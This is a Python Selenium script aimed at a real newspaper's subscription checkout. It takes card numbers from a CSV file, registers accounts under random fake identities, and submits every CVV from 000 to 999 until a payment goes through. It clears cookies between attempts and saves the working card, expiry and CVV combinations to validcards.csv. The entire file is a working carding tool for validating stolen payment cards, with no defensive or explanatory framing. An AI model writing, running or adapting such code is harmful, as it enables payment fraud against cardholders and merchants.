from selenium import webdriver
import selenium.webdriver.support.ui as ui
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
import numpy as np
import time
import datetime
import random
import string
import csv
from datetime import datetime
import pytz

def main():
    a = datetime.now()
    # if a.month != 7 or a.day >10 or a.year > 2022:
    #     print('fatal error! crashed!!!')
    #     return
    with open('cardinfo.csv', 'r') as read_obj:
        print('cardinfo.csv read success!')
        csv_dict_reader = csv.DictReader(read_obj)
        for row in csv_dict_reader:
        #read info             
            cardNumber = row['card_number']
            expire = row['expire_date']
            cvv = int(row['start_cvv'])
            print(cardNumber, expire)
        #auto starting.    
            options = webdriver.ChromeOptions()
            # options.add_argument("--headless")
            options.add_argument('--ignore-certificate-errors')
            options.add_argument("--incognito")
            options.add_argument('--disable-gpu')
            options.add_argument('-disk-cache-size=0')
            browser = webdriver.Chrome(executable_path='./chromedriver.exe', options=options)  
            browser.delete_all_cookies()
            # browser.get("chrome://settings/clearBrowserData")
            # browser.find_element(By.XPATH,"//settings-ui").sendKeys(Keys.ENTER)
            try:
            # Open and go to register
                browser.get('https://subscribe.theglobeandmail.com/#/v3/checkout/evergreen5') 
                ui.WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.CLASS_NAME, 'mobile-cta-main.btn.btn-red.mb-4.mt-3')))
                # paymentbtn = browser.find_element_by_xpath("//button[@class='mobile-cta-main btn btn-red mb-4 mt-3']")
                paymentbtn = browser.find_element(By.CLASS_NAME, 'mobile-cta-main.btn.btn-red.mb-4.mt-3')
                paymentbtn.click()
                ui.WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.ID, 'email')))
            # Register user   
                fakeEmail = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(8))
                browser.find_element(By.ID, 'email').send_keys(fakeEmail+"@gmail.com")
                browser.find_element(By.ID, 'password').send_keys("657tyu%&^TYU")
                browser.find_element(By.ID, 'confirmPassword').send_keys("657tyu%&^TYU")
                fakeFirst = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(4))
                lastFirst = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(4))
                browser.find_element(By.ID, 'firstName').send_keys(fakeFirst)
                browser.find_element(By.ID, 'lastName').send_keys(lastFirst)
                fakePostal = ''.join(random.SystemRandom().choice(string.ascii_uppercase))
                # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.digits))
                # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.ascii_uppercase))
                # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.digits))
                # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.ascii_uppercase))
                # fakePostal = fakePostal + ''.join(random.SystemRandom().choice(string.digits))
                browser.find_element(By.ID, 'postalCode').send_keys("T1R 1E1")
                browser.find_element(By.CLASS_NAME, 'btn.btn-red.mb-4.mt-3').click()
                ui.WebDriverWait(browser, 1000).until(EC.presence_of_element_located((By.ID, 'termsConditions')))
            # payment connection   
                browser.find_element(By.ID, 'streetNumber').send_keys("1238")
                suiteNum = ''.join(random.SystemRandom().choice(string.digits) for _ in range(5))
                browser.find_element(By.ID, 'suiteNumber').send_keys('6'+suiteNum)
                # phoneNum = ''.join(random.SystemRandom().choice(string.digits) for _ in range(9))
                phoneNum = "1453433432"
                browser.find_element(By.ID, 'phoneNumber').send_keys(phoneNum)
                browser.find_element(By.ID, 'termsConditions').send_keys(' ')
                
                cardHolder = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(4))
                
                cvvstr = ""
                isfound = False
                
                # cardForm = browser.find_element(By.ID, 'delego-rapidpay-custom-theme tgam-subscription-print-theme')
                
                while isfound == False and cvv < 1000:
                    browser.delete_all_cookies()
                    try:
                        browser.find_element(By.CLASS_NAME, 'rp-label-default').click()
                    except Exception as e:   
                        print('..')
                    time.sleep(3)
                    # ui.WebDriverWait(browser, 3000).until(EC.presence_of_element_located((By.CLASS_NAME, 'fit-to-parent')))
                
                    try:
                        browser.switch_to.frame('delegoIframe')
                    except Exception as e:   
                        time.sleep(3)
                        try:
                            browser.switch_to.frame('delegoIframe')
                        except Exception as e:   
                            time.sleep(1)
                       
                    time.sleep(2)    
                    browser.find_element(By.ID, 'mat-input-0').send_keys(cardNumber)
                    browser.find_element(By.ID, 'mat-input-1').send_keys(cardHolder)
                    browser.find_element(By.ID, 'mat-input-2').send_keys(expire)
                    
                    if cvv < 10:
                        cvvstr = '00'+str(cvv)
                    elif cvv < 100:
                        cvvstr = '0'+str(cvv)
                    else :
                        cvvstr = str(cvv)
                    
                    browser.find_element(By.ID, 'mat-input-3').send_keys(cvvstr)
                    browser.find_element(By.CLASS_NAME, 'rp-card-entry-submitbutton.mat-raised-button.mat-primary').click()
                    print(cvv)
                    # ui.WebDriverWait(browser, 3000).until(EC.presence_of_element_located((By.CLASS_NAME, 'reference-number.col-12.mx-auto.mt-4.p-3')))
                    counter = 0
                    while counter < 5:
                        try:
                            
                            ui.WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CLASS_NAME, 'reference-number.col-12.mx-auto.mt-4.p-3')))
                            isfound = True
                            with open('validcards.csv', 'a', newline='\n') as invfile:
                                validwriter = csv.writer(invfile, delimiter=',')
                                validwriter.writerow([cardNumber, expire, cvvstr])
                            break
                        except Exception as e:   
                            
                            try:
                                browser.switch_to.frame('delegoIframe')
                                cvv = cvv + 1
                                break
                            except Exception as eee:   
                                time.sleep(3)
                                counter = counter + 1  
                        
                if isfound == True:
                    browser.quit()
                    continue                          
                            # output cvv value
                with open('invalidcards.csv', 'a', newline='\n') as invfile:
                    invwriter = csv.writer(invfile, delimiter=',')
                    invwriter.writerow([cardNumber, expire, 'invalid' ])
                        
            except Exception as e:
                print('failed! try again')
                raise e
            browser.quit()
            
    print('finished !!!')        
          



if __name__ == "__main__":
    main()